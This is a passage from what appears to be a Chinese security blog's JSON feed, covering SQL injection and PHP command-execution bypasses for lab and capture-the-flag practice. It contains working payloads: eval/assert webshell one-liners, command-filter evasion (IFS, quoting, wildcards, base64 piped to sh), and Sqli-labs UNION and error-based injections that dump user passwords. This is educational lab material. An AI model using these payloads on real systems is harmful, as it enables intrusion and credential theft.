aaaaaaaaa’,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">自动转义为aaaaaaaaa\\&#x27;,由于字符串长度限制被截取为aaaaaaaaa\\,转义了预置的单引号,就能注入了</span><br><span class=\"line\">?title=aaaaaaaaa&#x27;&amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#</span><br></pre></td></tr></table></figure>\n<p>sql 语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;aaaaaaaaa&#x27;</span>,<span class=\"string\">&#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>此时表</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">title</th>\n<th style=\"text-align:center\">content</th>\n<th style=\"text-align:center\">time</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">this is title</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">aaaaaaaaa’,</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">admin_password</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>可发现新加了两行，成功注入</p>\n<p>mid () 函数<br>\n select mid (column_name,start,length)<br>\n right () 函数<br>\n从指定字符串的<mark>右侧</mark>提取给定长度的字符<br>\n select right (column_name,length)<br>\n substr () 函数<br>\n与 mid () 一样<br>\n reverse () 函数<br>\n反转字符串</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "命令执行漏洞及绕过方法",
            "date_published": "2023-04-28T11:14:02.548Z",
            "content_html": "<h2 id=\"代码执行\"><a class=\"markdownIt-Anchor\" href=\"#代码执行\">#</a> 代码执行</h2>\n<p>代码执行：未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器上<mark>执行恶意代码.</mark><br>\n 可变函数：一个变量名后面如果有圆括号，php 将寻找同名函数调用</p>\n<p>eval: 将一个字符串作为 php 代码执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>\n<p>eval 是一个语言构造器，不是函数，不能当可变函数</p>\n<p>assert (): 执行一个有返回值的 php 表达式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>\n<p>php7.2 以后与 eval 一样是语言构造器不是函数</p>\n<p>call_user_func (): 把第一个参数作为回调函数使用，其他参数是回调函数参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(&#x27;assert&#x27;,&#x27;eval($_POST[&#x27;123&#x27;])&#x27;)</span><br></pre></td></tr></table></figure>\n<p>call_user_func_array (): 把第一个参数作为回调参数使用，第二个数组类型作为回调函数的参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func_array(&#x27;assert&#x27;,[&#x27;eval($__POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>\n<p>array_map (): 为数组的每一个元素应用回调函数，第一个参数是回调函数，第二个参数是数组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_map(&#x27;assert&#x27;,[&#x27;eval($POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>\n<p>array_filter (): 使用回调函数过滤数组中的元素。第一个参数是数组，第二个参数是回调函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_filter([&#x27;eval($__POST[&#x27;123&#x27;])&#x27;],&#x27;assert&#x27;)</span><br></pre></td></tr></table></figure>\n<p>array_reduce (): 发送数组中的值到回调函数调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_reduce([1,2],&#x27;assert&#x27;,&#x27;phpinfo()&#x27;)</span><br></pre></td></tr></table></figure>\n<p>phpinfo () 是发送的第一个参数</p>\n<p>preg_replace (): 将匹配到的字符串替换为指定的字符串并返回完整字符串</p>\n<h2 id=\"命令执行\"><a class=\"markdownIt-Anchor\" href=\"#命令执行\">#</a> 命令执行</h2>\n<p>未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器<mark>终端执行系统命令</mark></p>\n<p>system()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(whoami)</span><br></pre></td></tr></table></figure>\n<p>passthru()<br>\n 同 system ()</p>\n<p>exec (): 默认没有回显，需要手动加上 echo. 而且回显只会输出一行结果，因此经常用第二个数组参数接收多行结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$arr=[];</span><br><span class=\"line\">echo exec(&#x27;ipconfig&#x27;,$arr);</span><br><span class=\"line\">var_dump($arr);</span><br></pre></td></tr></table></figure>\n<p>shell_exec (): 默认没有回显，需要手动加上 echo, 可以输出多行结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$arr=[];</span><br><span class=\"line\">echo shell_exec(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure>\n<p>反引号：反引号内的代码被当作系统命令执行，默认没有回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo `ipconfig`;</span><br></pre></td></tr></table></figure>\n<p>popen (): 打开一个指向进程的通道，该进程由派生给定的 command 命令执行而生产</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$fp=popen(&#x27;whoami&#x27;,&#x27;r&#x27;);</span><br><span class=\"line\">while(!feof($fp))&#123;</span><br><span class=\"line\">$content=fgetss($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $content;</span><br></pre></td></tr></table></figure>\n<h2 id=\"基础\"><a class=\"markdownIt-Anchor\" href=\"#基础\">#</a> 基础</h2>\n<h3 id=\"1转义字符\"><a class=\"markdownIt-Anchor\" href=\"#1转义字符\">#</a> 1. 转义字符</h3>\n<p>Windows 下是 ^  Linux 下是 \\</p>\n<h3 id=\"2多条命令执行\"><a class=\"markdownIt-Anchor\" href=\"#2多条命令执行\">#</a> 2. 多条命令执行</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows:&amp;&amp;,||,%0a</span><br><span class=\"line\">linux:&amp;&amp;,||,;,$(),``,%0a,%0d</span><br></pre></td></tr></table></figure>\n<p>%0a 和 %0d 是由于换行才可以多条命令执行<br>\n<mark> Linux 下双引号包裹的字符串 $() 会被当做命令执行，单引号单纯就是字符串</mark></p>\n<h3 id=\"3注释符号\"><a class=\"markdownIt-Anchor\" href=\"#3注释符号\">#</a> 3. 注释符号</h3>\n<p>Windows:&quot;::&quot;<br>\nLinux:&quot;#&quot;</p>\n<h2 id=\"常见连接符管道符\"><a class=\"markdownIt-Anchor\" href=\"#常见连接符管道符\">#</a> 常见连接符 (管道符)</h2>\n<ol>\n<li>|：A|B 不管 A 命令成功与否，都会去执行 b 命令。</li>\n<li>&amp;：A&amp;B 各自执行</li>\n<li>||：A||B 先执行 A，如果为假，才执行 B</li>\n<li>&amp;&amp; ：A&amp;&amp;B 先执行 A，如果为真，才执行 B</li>\n<li>；： A;B 先执行 A 后执行 B</li>\n</ol>\n<p>可以执行的命令:</p>\n   <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo 查看系统信息</span><br><span class=\"line\">ipconfig  查看本地网络</span><br><span class=\"line\">net  user  查看系统用户</span><br><span class=\"line\">dir  查看当前目录</span><br><span class=\"line\">whoami 用户名</span><br><span class=\"line\">ver操作系统 (username -a)</span><br><span class=\"line\">netstat 网络连接 (Linux是netstat -an)</span><br><span class=\"line\">tasklist 运行进程(Linux是ps -ef)</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过方法\"><a class=\"markdownIt-Anchor\" href=\"#绕过方法\">#</a> 绕过方法</h2>\n<h3 id=\"1空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#1空格绕过\">#</a> 1. 空格绕过</h3>\n<p>1. <code>$&#123;IFS&#125;,&#123;IFS&#125;,$IFS,&lt;,&lt;&gt;,</code> <br>\n2.$IFS$9 $9 指传过来的第 9 个参数<br>\n 3.%09 ,%0b,%0c 等，可以用 burp 在 %00-% ff 之间爆破<br>\n 4. 字符串截取<br>\n 1.Windows 下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%ProgramFiles:~10,1%</span><br><span class=\"line\">~是截取符,表示获取环境变量%ProgramFiles%的值,一般是C:\\Program Files,这个命令在把它第十位截取一位,就是空格</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo%ProgramFiles:~10,1%111</span><br><span class=\"line\">111</span><br></pre></td></tr></table></figure>\n<p>2.Linux 下:<br>\n(1)$IFS$9<br>\n (2){cmd,args}  bash 有效，zsh 和 dash 无效<br>\n (3) 读取文件时:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure>\n<p>注意：可以让 IFS=, 来进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo;IFS=,;cat flag</span><br><span class=\"line\">echo;IFS=,;whoami</span><br></pre></td></tr></table></figure>\n<p>4.&lt;或者 &lt;&gt; 重定向</p>\n<h2 id=\"2黑名单绕过\"><a class=\"markdownIt-Anchor\" href=\"#2黑名单绕过\">#</a> 2. 黑名单绕过</h2>\n<p>1. 变量拼接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=c;b=at;c=fl;d=ag;$a$b$c$d</span><br></pre></td></tr></table></figure>\n<p>2. 单引号，双引号绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ca&#x27;&#x27;t flag</span><br><span class=\"line\">cat&quot;&quot; flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"3编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#3编码绕过\">#</a> 3. 编码绕过</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.$(printf &quot;\\154\\163&quot;) ==&gt;ls</span><br><span class=\"line\">2.$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag</span><br><span class=\"line\">3.</span><br><span class=\"line\">&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"4读文件绕过当cat被过滤\"><a class=\"markdownIt-Anchor\" href=\"#4读文件绕过当cat被过滤\">#</a> 4. 读文件绕过 (当 cat 被过滤)</h2>\n<p>(1) more: 一页一页的显示档案内容<br>\n (2) less: 与 more 类似，但是比 more 更好的是，他可以 [pg dn][pg up] 翻页<br>\n (3) head: 查看头几行<br>\n (4) tac: 从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>\n (5) tail: 查看尾几行<br>\n (6) nl：显示的时候，顺便输出行号<br>\n (7) od: 以二进制的方式读取档案内容<br>\n (8) vi: 一种编辑器，这个也可以查看<br>\n (9) vim: 一种编辑器，这个也可以查看<br>\n (10) sort: 可以查看<br>\n (11) uniq: 可以查看<br>\n (12) file -f: 报错出具体内容</p>\n<h2 id=\"5反斜线\"><a class=\"markdownIt-Anchor\" href=\"#5反斜线\">#</a> 5. 反斜线</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c\\at fl\\ag</span><br></pre></td></tr></table></figure>\n<h2 id=\"612等和\"><a class=\"markdownIt-Anchor\" href=\"#612等和\">#</a> 6.$1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mtext>等和</mtext></mrow><annotation encoding=\"application/x-tex\">2等和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord cjk_fallback\">等</span><span class=\"mord cjk_fallback\">和</span></span></span></span> @</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c$1at fl$@ag</span><br></pre></td></tr></table></figure>\n<h2 id=\"7通配符绕过\"><a class=\"markdownIt-Anchor\" href=\"#7通配符绕过\">#</a> 7. 通配符绕过</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?&quot;代表一个字符,&quot;*&quot;代表一串字符</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class=\"line\">2.?at flag</span><br><span class=\"line\">3.?at ????</span><br><span class=\"line\">4.?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]表示一个范围(正则),eg[abcd]匹配a,b,c,d</span><br><span class=\"line\">&#123;&#125;产生一个序列</span><br></pre></td></tr></table></figure>\n<h2 id=\"8内敛执行绕过\"><a class=\"markdownIt-Anchor\" href=\"#8内敛执行绕过\">#</a> 8. 内敛执行绕过</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zxcv0221@kali:~/桌面$ echo &quot;m0re`cat flag`&quot;</span><br><span class=\"line\">m0reyou are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ echo &quot;m0re $(cat flag)&quot;</span><br><span class=\"line\">m0re you are good!</span><br><span class=\"line\">zxcv0221@kali:~/桌面$ echo &quot;m0re $(pwd)&quot;</span><br><span class=\"line\">m0re /home/zxcv0221/桌面</span><br></pre></td></tr></table></figure>\n<h2 id=\"9编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#9编码绕过\">#</a> 9. 编码绕过</h2>\n<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code> <br>\n 有的题目过滤了 bash, 可以用 sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash无法使用</span><br><span class=\"line\">可以用?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|sh</span><br></pre></td></tr></table></figure>\n<p>ZmxhZw==|base64 -d</p>\n<h2 id=\"10绕过长度限制和的使用\"><a class=\"markdownIt-Anchor\" href=\"#10绕过长度限制和的使用\">#</a> 10. 绕过长度限制 &gt; 和 &gt;&gt; 的使用</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用`&gt;`命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&gt;&gt;`符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br></pre></td></tr></table></figure>\n<h2 id=\"11命令换行\"><a class=\"markdownIt-Anchor\" href=\"#11命令换行\">#</a> 11. 命令换行</h2>\n<p>ca<br>\nt<br>\nfl<br>\nag</p>\n<h2 id=\"12借用已有字符串\"><a class=\"markdownIt-Anchor\" href=\"#12借用已有字符串\">#</a> 12. 借用已有字符串</h2>\n<p>substr 截取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">expr substr ceshi01.php 3 5</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo `expr substr $(awk NR==1 ceshi01.php) 1 1`</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "url": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "title": "Sqli-labs靶场通关",
            "date_published": "2023-04-28T07:34:52.582Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 2-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数<br>\n MySQL 的一些表结构：(可以通过 phpmyadmin 观察学习)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">information_schema是MySQL自带的默认数据库,里面有三个</span><br><span class=\"line\">表(schemata,tables,columns)</span><br><span class=\"line\"></span><br><span class=\"line\">schemata表(记载着数据库的信息),这个表里面有个字段schema_name(数据库名)</span><br><span class=\"line\"></span><br><span class=\"line\">tables(表),里面有table_name字段(数据表名),和table_schema字段(当前字段所属数据表所在的数据库)</span><br><span class=\"line\">比如security库里面有email表:</span><br><span class=\"line\"></span><br><span class=\"line\">table_schema  table_name</span><br><span class=\"line\">security        email</span><br><span class=\"line\"></span><br><span class=\"line\">columns表,除了table_name和table_schema字段外还有一个column_name字段(某数据库某个表的某个字段名)</span><br></pre></td></tr></table></figure>\n<p>less1<br>\n 字符型注入<br>\n看源码: <code>sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code></p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; order by 3--+</span><br><span class=\"line\">?id=1&#x27; order by 4--+</span><br><span class=\"line\">?id=-1&#x27; union select 1,2,3--+//判断回显位</span><br><span class=\"line\">?id=-1&#x27; union select 1,2,database()--+</span><br><span class=\"line\">?id=-1&#x27; union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(username,0x7e,password) from users--+</span><br><span class=\"line\">//0x7e是为了让结过美观一点,比如Dumb~Dumb</span><br></pre></td></tr></table></figure>\n<p>此外通过 <code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code>  还有可以看到所以的数据库信息</p>\n<p>less2<br>\n 数字型<br>\n看源码: <code>sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code> <br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1 union select 1,2,group_concat(username,0x7e,password) from users</span><br></pre></td></tr></table></figure>\n<p>less3<br>\n 源码: <code>$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;</code> <br>\n 单引号括号字符型闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(username,0x7e,password) from users--+</span><br></pre></td></tr></table></figure>\n<p>less4<br>\n 源码: <code>$id = '&quot;' . $id . '&quot;';$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code> <br>\n 双引号括号字符型闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(username,0x7e,password) from users--+</span><br></pre></td></tr></table></figure>\n<p>less5<br>\n 此题不回显 SQL 语句的结果了，只回显 (You are in… 或者无回显), 但是源代码有 <code>print_r(mysql_error());</code>  会将语法错误打印出来，我们已知字段数是 3, 写入 <code>?id=1' order by 4--+</code>  发现成功回显，因此可以用报错注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">报错注入:updatexml()函数,extractvalue()函数</span><br><span class=\"line\">updatexml(xml_doument,XPath_string,new_value)</span><br><span class=\"line\">第一个参数：XML的内容</span><br><span class=\"line\">第二个参数：是需要update的位置XPATH路径</span><br><span class=\"line\">第三个参数：是更新后的内容</span><br><span class=\"line\">所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容</span><br><span class=\"line\">可以校验的:0x7e(~),0x5e24(^$),&#x27;#&#x27;(#)</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue（XML_document，xpath_string）</span><br><span class=\"line\">第一个参数是XML对象的名称,随便写,第二个参数是XPAT和格式的字符串,主要让它格式出现错误</span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">一些截取函数技巧:</span><br><span class=\"line\">concat(参数1,参数2) 将参数1与参数2连接起来</span><br><span class=\"line\">substring(目标,起始,长度)</span><br><span class=\"line\">substr,mid用法一样</span><br><span class=\"line\">还有right(column_name,length)从右侧读取length长度和reverse()反转字符串函数</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,database()),1)--+暴当前数据库</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">此时会出现Subquery returns more than 1 row</span><br><span class=\"line\">根据提示可以知道结果有多行,本地复现一下</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select table_name from information_schema.tables where table_schema=database();</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| table_name |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| emails     |</span><br><span class=\"line\">| referers   |</span><br><span class=\"line\">| uagents    |</span><br><span class=\"line\">| users      |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.可以用limit解决,limit 0,1 1,1 2,1 3,1</span><br><span class=\"line\">在limit 3,1找到users表</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 3,1)),1)--+</span><br><span class=\"line\">后面同理爆字段,不过很麻烦</span><br><span class=\"line\"></span><br><span class=\"line\">2.加个group_concat(将多行数据用逗号连接)把所有表名连接成一行</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">此时结果:</span><br><span class=\"line\"> emails,referers,uagents,users</span><br><span class=\"line\">最后:</span><br><span 